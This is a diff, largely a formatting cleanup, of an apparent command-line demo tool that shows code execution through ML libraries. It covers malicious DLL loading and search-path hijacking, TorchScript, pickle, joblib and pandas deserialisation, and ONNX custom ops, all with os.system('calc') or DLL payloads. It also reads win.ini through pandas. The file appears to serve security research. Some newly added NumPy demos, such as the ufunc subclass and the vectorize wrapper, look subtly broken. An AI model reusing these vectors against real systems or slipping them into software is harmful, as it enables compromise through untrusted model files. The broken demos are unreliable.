@@ -9,15 +9,16 @@ def print_func(function):
     Function to pretty print code after execution.
     """
     source = inspect.getsource(function)
-    relevant_code = re.findall(r'###(.*)###', source, re.DOTALL)[0]
+    relevant_code = re.findall(r"###(.*)###", source, re.DOTALL)[0]
     print(relevant_code)
 
 
 app = typer.Typer()
 
-#----------------------------------#
+
+# ----------------------------------#
 #             TENSORFLOW           #
-#----------------------------------# 
+# ----------------------------------#
 @app.command()
 def tf_load_op_library():
     """
@@ -26,10 +27,12 @@ def tf_load_op_library():
 
     ###
     import tensorflow as tf
+
     tf.load_op_library("./bin/hello.dll")
     ###
 
     print_func(tf_load_op_library)
+
 
 @app.command()
 def tf_load_library():
@@ -39,30 +42,34 @@ def tf_load_library():
 
     ###
     import tensorflow as tf
+
     tf.load_library("./bin/hello.dll")
     ###
 
     print_func(tf_load_library)
+
 
 @app.command()
 def tf_dll_hijack():
     """
     Writes a dll to search path prior to Tensorflow import.
     """
-    
+
     ###
     import shutil
+
     shutil.copyfile("./bin/hello.dll", "./cudart64_110.dll")
 
     import tensorflow as tf
+
     ###
 
     print_func(tf_dll_hijack)
 
 
-#----------------------------------#
+# ----------------------------------#
 #             PYTORCH              #
-#----------------------------------# 
+# ----------------------------------#
 @app.command()
 def torch_classes_load_library():
     """
@@ -71,10 +78,12 @@ def torch_classes_load_library():
 
     ###
     import torch
+
     torch.classes.load_library("./bin/hello.dll")
     ###
 
     print_func(torch_classes_load_library)
+
 
 @app.command()
 def torch_load():
@@ -84,10 +93,12 @@ def torch_load():
 
     ###
     import torch
+
     torch.load("./bin/model.pickle")
     ###
 
     print_func(torch_load)
+
 
 @app.command()
 def torch_jit():
@@ -101,13 +112,14 @@ def torch_jit():
     class Calc(torch.nn.Module):
         def __init__(self):
             super().__init__()
-            import os; os.system('calc')
+            import os
 
+            os.system("calc")
 
     m = torch.jit.script(Calc())
 
-    torch.jit.save(m, './bin/torch_jit.pt')
-    torch.jit.load('./bin/torch_jit.pt')
+    torch.jit.save(m, "./bin/torch_jit.pt")
+    torch.jit.load("./bin/torch_jit.pt")
     ###
 
     print_func(torch_jit)
@@ -130,9 +142,9 @@ def torch_jit():
 #     verbose=True
 # )
 
-#----------------------------------#
+# ----------------------------------#
 #             KERAS                #
-#----------------------------------# 
+# ----------------------------------#
 # @app.command()
 # def keras_layer():
 #     """
@@ -174,9 +186,9 @@ def torch_jit():
 #     print_func(keras_layer)
 
 
-#----------------------------------#
+# ----------------------------------#
 #             NUMPY                #
-#----------------------------------# 
+# ----------------------------------#
 @app.command()
 def numpy_load_library():
     """
@@ -185,10 +197,12 @@ def numpy_load_library():
 
     ###
     import numpy
+
     numpy.ctypeslib.load_library("./bin/hello.dll", ".")
     ###
 
     print_func(numpy_load_library)
+
 
 @app.command()
 def numpy_f2py():
@@ -200,20 +214,22 @@ def numpy_f2py():
     from numpy import f2py
 
     sourcecode = ""
-    f2py.compile(sourcecode, modulename='exec')
+    f2py.compile(sourcecode, modulename="exec")
     ###
 
     print_func(numpy_f2py())
+
 
 @app.command()
 def numpy_load():
     """
     Standard numpy.load()
     """
-    
+
     ###
     import numpy
-    numpy.load('bin/model.pickle', allow_pickle=True)
+
+    numpy.load("bin/model.pickle", allow_pickle=True)
     ###
 
     print_func(numpy_load)
@@ -230,37 +246,120 @@ def numpy_array():
 
     class ArrayExec:
         import os
-        os.system('calc')
+
+        os.system("calc")
 
         def __array__(self):
             return 1
 
-    
     numpy.asarray(ArrayExec)
     ###
 
     print_func(numpy_array)
 
 
-#----------------------------------#
+@app.command()
+def numpy_frompyfunc():
+    """
+    Loads code via numpy.frompyfunc()
+    """
+
+    ###
+    import numpy
+
+    def exec(x):
+        import os
+
+        os.system("calc")
+        return x
+
+    numpy.frompyfunc(exec, 1, 1)
+    ###
+
+    print_func(numpy_frompyfunc)
+
+
+@app.command()
+def numpy_vectorize():
+    """
+    Loads code via numpy.vectorize()
+    """
+
+    ###
+    import numpy
+
+    def exec(x):
+        import os
+
+        os.system("calc")
+        return x
+
+    numpy.vectorize(exec)
+    ###
+
+    print_func(numpy_vectorize)
+
+
+@app.command()
+def numpy_ufunc():
+    """
+    Loads code via numpy.ufunc()
+    """
+
+    ###
+    import numpy
+
+    class ExecUFunc(numpy.ufunc):
+        def __call__(self, x):
+            import os
+
+            os.system("calc")
+            return x
+
+    numpy.add(ExecUFunc)
+    ###
+
+    print_func(numpy_ufunc)
+
+
+@app.command()
+def numpy_distutils_exec_command():
+    """
+    Loads code via numpy.distutils.exec_command()
+    """
+
+    ###
+    import numpy.distutils
+
+    numpy.distutils.exec_command("calc")
+    ###
+
+    print_func(numpy_distutils_exec_command)
+
+
+# ----------------------------------#
 #             ONNX                 #
-#----------------------------------# 
+# ----------------------------------#
 @app.command()
 def onnx_convert_ort():
     """
     Loads code via a custom_op_library during conversion from ONNX to the internal ORT model format.
     """
-    ###    
+    ###
     import os
-    os.system("python -m onnxruntime.tools.convert_onnx_models_to_ort ./bin/onnx --custom_op_library ./bin/custom_op.dll")
+
+    os.system(
+        "python -m onnxruntime.tools.convert_onnx_models_to_ort ./bin/onnx --custom_op_library ./bin/custom_op.dll"
+    )
     ###
 
     print_func(onnx_convert_ort)
 
+
 @app.command()
 def onnx_session_options():
     """
-    Loads code via ONNX SessionOptions.register_custom_ops(). 
+    Loads code via ONNX SessionOptions.register_custom_ops().
     """
 
     ###
@@ -275,9 +374,9 @@ def onnx_session_options():
     print_func(onnx_session_options)
 
 
-#----------------------------------#
+# ----------------------------------#
 #             PICKLE               #
-#----------------------------------# 
+# ----------------------------------#
 @app.command()
 def pickle_load():
     """
@@ -287,16 +386,16 @@ def pickle_load():
     ###
     import pickle
 
-    with open('bin/model.pickle', 'rb') as fun:
+    with open("bin/model.pickle", "rb") as fun:
         pickle.load(fun)
     ###
 
     print_func(pickle_load)
 
 
-#----------------------------------#
+# ----------------------------------#
 #             PANDAS               #
-#----------------------------------# 
+# ----------------------------------#
 @app.command()
 def pandas_read_pickle():
     """
@@ -306,7 +405,7 @@ def pandas_read_pickle():
     ###
     import pandas
 
-    pandas.read_pickle('./bin/model.pickle')
+    pandas.read_pickle("./bin/model.pickle")
     ###
 
     print_func(pandas_read_pickle)
@@ -319,14 +418,16 @@ def pandas_read_csv():
     """
     ###
     import pandas
+
     print(pandas.read_csv("file:////c://Windows//win.ini"))
     ###
 
     print_func(pandas_read_csv)
 
-#----------------------------------#
+
+# ----------------------------------#
 #             SKLEARN              #
-#----------------------------------# 
+# ----------------------------------#
 @app.command()
 def sklearn_load():
     """
@@ -334,14 +435,16 @@ def sklearn_load():
     """
     ###
     import joblib
-    joblib.load('./bin/model.pickle')
+
+    joblib.load("./bin/model.pickle")
     ###
 
     print_func(sklearn_load)
 
-#----------------------------------#
+
+# ----------------------------------#
 #             JUPYTER              #
-#----------------------------------# 
+# ----------------------------------#
 @app.command()
 def jupyer_auto_load():
     """
@@ -366,7 +469,7 @@ def jupyer_auto_load():
 @app.command()
 def optuna_attack():
     """
-    Runs Optuna against the "discovered" number of input size for the toy model. Objective is arbitrary. 
+    Runs Optuna against the "discovered" number of input size for the toy model. Objective is arbitrary.
     """
     import optuna
     import pickle
